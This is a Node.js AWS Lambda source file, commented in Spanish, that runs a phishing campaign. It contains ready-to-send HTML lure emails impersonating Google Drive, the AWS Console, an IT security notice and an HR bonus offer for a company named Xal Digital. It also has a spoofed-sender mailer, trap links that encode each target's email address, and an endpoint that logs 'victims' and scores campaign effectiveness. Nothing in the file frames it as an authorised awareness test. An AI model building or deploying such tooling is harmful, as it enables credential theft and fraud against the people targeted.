const nodemailer = require('nodemailer');
const dotenv = require('dotenv');

dotenv.config();

// Arrays en memoria para logs
let campaignsLog = [];
let victimsLog = [];

// Configuración SMTP
const smtpConfig = {
  host: process.env.SMTP_HOST,
  port: parseInt(process.env.SMTP_PORT),
  secure: true,
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS
  }
};

const transporter = nodemailer.createTransport(smtpConfig);

// Plantillas de correo
const plantillas = {
  drive: {
    asunto: '📎 Documento importante compartido contigo',
    cuerpo: (nombreObjetivo, remitenteFalso, urlTrampa) => `
      <div style='font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;'>
        <div style='background: #4285f4; padding: 20px; text-align: center;'>
          <h2 style='color: white; margin: 0;'>Google Drive</h2>
        </div>
        <div style='padding: 30px; background: #f5f5f5;'>
          <p>Hola ${nombreObjetivo},</p>
          <p><strong>${remitenteFalso}</strong> ha compartido un documento importante contigo en Google Drive:</p>
          <div style='background: white; padding: 20px; margin: 20px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);'>
            <p style='margin: 0; color: #666;'>📄 <strong>Reporte_Confidencial_Q4_2024.pdf</strong></p>
            <p style='margin: 10px 0 0 0; color: #999; font-size: 12px;'>Compartido hace 5 minutos</p>
          </div>
          <div style='text-align: center; margin: 30px 0;'>
            <a href='${urlTrampa}' style='background: #4285f4; color: white; padding: 12px 30px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold;'>Abrir Documento</a>
          </div>
          <p style='color: #999; font-size: 11px; margin-top: 30px;'>
            Este correo contiene información confidencial. Si no eras el destinatario, por favor elimínalo.
          </p>
        </div>
      </div>
    `
  },
  aws: {
    asunto: '☁️ Acceso AWS Console - Crítico',
    cuerpo: (nombreObjetivo, remitenteFalso, urlTrampa) => `
      <div style='font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;'>
        <div style='background: #232f3e; padding: 20px; text-align: center;'>
          <h2 style='color: white; margin: 0;'>AWS Console</h2>
        </div>
        <div style='padding: 30px; background: #f5f5f5;'>
          <p>Hola ${nombreObjetivo},</p>
          <p>Se ha detectado actividad sospechosa en tu cuenta de AWS. Por seguridad, necesitas verificar tu acceso inmediatamente.</p>
          <div style='background: #fff3cd; padding: 15px; margin: 20px 0; border-left: 4px solid #ffc107;'>
            <p style='margin: 0; color: #856404;'><strong>⚠️ Acción requerida</strong></p>
            <p style='margin: 10px 0 0 0; color: #856404;'>Tu cuenta será suspendida en 24 horas si no verificas tu identidad.</p>
          </div>
          <div style='text-align: center; margin: 30px 0;'>
            <a href='${urlTrampa}' style='background: #232f3e; color: white; padding: 12px 30px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold;'>Verificar Cuenta AWS</a>
          </div>
          <p style='color: #666; font-size: 13px;'>Saludos,<br><strong>${remitenteFalso}</strong><br>AWS Security Team</p>
        </div>
      </div>
    `
  },
  ceo: {
    asunto: '⚠️ URGENTE: Actualización de credenciales - Acción requerida',
    cuerpo: (nombreObjetivo, remitenteFalso, urlTrampa) => `
      <div style='font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; border: 2px solid #d32f2f;'>
        <div style='background: #d32f2f; padding: 15px;'>
          <h2 style='color: white; margin: 0;'>⚠️ ACCIÓN REQUERIDA</h2>
        </div>
        <div style='padding: 30px; background: white;'>
          <p>Estimado/a ${nombreObjetivo},</p>
          <p>Por razones de seguridad, el departamento de TI ha detectado un intento de acceso no autorizado a varios correos corporativos.</p>
          <p><strong>Como medida preventiva, es OBLIGATORIO que verifiques tu identidad antes de las 18:00 hrs de hoy.</strong></p>
          <div style='background: #fff3cd; padding: 15px; margin: 20px 0; border-left: 4px solid #ffc107;'>
            <p style='margin: 0; color: #856404;'><strong>⏰ Tiempo límite: HOY a las 18:00 hrs</strong></p>
            <p style='margin: 10px 0 0 0; color: #856404;'>Si no verificas tu cuenta, se suspenderá temporalmente el acceso.</p>
          </div>
          <div style='text-align: center; margin: 30px 0;'>
            <a href='${urlTrampa}' style='background: #d32f2f; color: white; padding: 15px 40px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold;'>VERIFICAR AHORA</a>
          </div>
          <p style='color: #666; font-size: 13px;'>Saludos,<br><strong>${remitenteFalso}</strong><br>Xal Digital</p>
        </div>
      </div>
    `
  },
  rh: {
    asunto: '💰 Bonos de fin de año - Información importante',
    cuerpo: (nombreObjetivo, remitenteFalso, urlTrampa) => `
      <div style='font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;'>
        <div style='background: #2e7d32; padding: 20px; text-align: center;'>
          <h2 style='color: white; margin: 0;'>Recursos Humanos - Xal Digital</h2>
        </div>
        <div style='padding: 30px; background: #f5f5f5;'>
          <p>Hola ${nombreObjetivo},</p>
          <p>¡Tenemos excelentes noticias! 🎉</p>
          <p>La dirección ha aprobado los bonos extraordinarios de fin de año. Para procesar tu pago, necesitamos que confirmes tus datos en el siguiente formulario:</p>
          <div style='background: white; padding: 20px; margin: 20px 0; border-radius: 8px; text-align: center;'>
            <p style='font-size: 24px; color: #2e7d32; margin: 10px 0;'><strong>💰 Bono disponible</strong></p>
            <p style='color: #666;'>Debes confirmar tus datos antes del 15 de diciembre</p>
          </div>
          <div style='text-align: center; margin: 30px 0;'>
            <a href='${urlTrampa}' style='background: #2e7d32; color: white; padding: 12px 30px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold;'>Confirmar Datos</a>
          </div>
          <p style='color: #666; font-size: 13px;'>Departamento de Recursos Humanos<br><strong>${remitenteFalso}</strong></p>
        </div>
      </div>
    `
  }
};

// Función para registrar logs
function registrarLog(tipo, datos) {
  const timestamp = new Date().toISOString();
  const entry = {
    id: `${tipo}-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    tipo,
    timestamp,
    ...datos
  };
  
  if (tipo === 'ENVIADO') {
    campaignsLog.push(entry);
  } else {
    victimsLog.push(entry);
  }
  
  console.log(`${tipo}:`, entry);
}

// Handler principal
exports.handler = async (event, context) => {
  console.log('Event:', JSON.stringify(event, null, 2));
  
  const method = event.requestContext.http.method;
  const path = event.rawPath;
  
  // Headers CORS
  const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type'
  };
  
  // Manejar OPTIONS (CORS preflight)
  if (method === 'OPTIONS') {
    return {
      statusCode: 200,
      headers: corsHeaders,
      body: ''
    };
  }
  
  try {
    // Parsear body si existe
    let body = {};
    if (event.body) {
      body = JSON.parse(event.body);
    }
    
    // Routing manual
    if (method === 'POST' && (path === '/api/send-phishing' || path === '/prod/api/send-phishing')) {
      return await handleSendPhishing(body, corsHeaders);
    }
    
    if (method === 'POST' && (path === '/api/capture' || path === '/prod/api/capture')) {
      return await handleCapture(body, corsHeaders);
    }
    
    if (method === 'GET' && (path === '/api/stats' || path === '/prod/api/stats')) {
      return await handleStats(corsHeaders);
    }
    
    // Ruta no encontrada
    return {
      statusCode: 404,
      headers: corsHeaders,
      body: JSON.stringify({ error: 'Ruta no encontrada' })
    };
    
  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      headers: corsHeaders,
      body: JSON.stringify({ error: 'Error interno del servidor' })
    };
  }
};

// Handler para enviar phishing
async function handleSendPhishing(body, corsHeaders) {
  const { destinatario, nombreObjetivo, remitenteFalso, asunto, tipoPlantilla } = body;
  
  // Validar datos
  if (!destinatario || !nombreObjetivo || !remitenteFalso || !tipoPlantilla) {
    return {
      statusCode: 400,
      headers: corsHeaders,
      body: JSON.stringify({ error: 'Faltan campos requeridos' })
    };
  }
  
  // URLs de captura
  const rutasCreibles = {
    drive: `/drive/share/document?id=${Buffer.from(destinatario).toString('base64')}&access=view`,
    aws: `/console/signin?redirect=${Buffer.from(destinatario).toString('base64')}&region=us-east-1`,
    ceo: `/security/verify-account?token=${Buffer.from(destinatario).toString('base64')}&urgent=true`,
    rh: `/portal/rh/bonos?employee=${Buffer.from(destinatario).toString('base64')}&year=2024`
  };
  
  const urlTrampa = `${process.env.BASE_URL}${rutasCreibles[tipoPlantilla]}&type=${tipoPlantilla}`;
  
  // Obtener plantilla
  const plantilla = plantillas[tipoPlantilla];
  if (!plantilla) {
    return {
      statusCode: 400,
      headers: corsHeaders,
      body: JSON.stringify({ error: 'Tipo de plantilla inválido' })
    };
  }
  
  // Configurar correo
  const mailOptions = {
    from: `"${remitenteFalso}" <${smtpConfig.auth.user}>`,
    to: destinatario,
    subject: asunto || plantilla.asunto,
    html: plantilla.cuerpo(nombreObjetivo, remitenteFalso, urlTrampa)
  };
  
  try {
    // Enviar correo
    await transporter.sendMail(mailOptions);
    
    // Registrar envío
    registrarLog('ENVIADO', {
      destinatario,
      remitenteFalso,
      tipoPlantilla
    });
    
    return {
      statusCode: 200,
      headers: corsHeaders,
      body: JSON.stringify({ 
        success: true, 
        message: `✅ Correo enviado exitosamente a: ${destinatario}` 
      })
    };
  } catch (error) {
    console.error('Error enviando correo:', error);
    return {
      statusCode: 500,
      headers: corsHeaders,
      body: JSON.stringify({ 
        error: '❌ Error al enviar el correo. Verifica la configuración SMTP.' 
      })
    };
  }
}

// Handler para capturar víctimas
async function handleCapture(body, corsHeaders) {
  const { email, ip, userAgent, plantilla } = body;
  
  registrarLog('CAPTURADO', {
    email,
    ip,
    userAgent,
    plantilla
  });
  
  return {
    statusCode: 200,
    headers: corsHeaders,
    body: JSON.stringify({ success: true })
  };
}

// Handler para estadísticas
async function handleStats(corsHeaders) {
  const enviados = campaignsLog.length;
  const capturados = victimsLog.length;
  const efectividad = enviados > 0 ? ((capturados / enviados) * 100).toFixed(1) : 0;
  
  return {
    statusCode: 200,
    headers: corsHeaders,
    body: JSON.stringify({
      enviados,
      capturados,
      efectividad: `${efectividad}%`,
      campaigns: campaignsLog,
      victims: victimsLog
    })
  };
}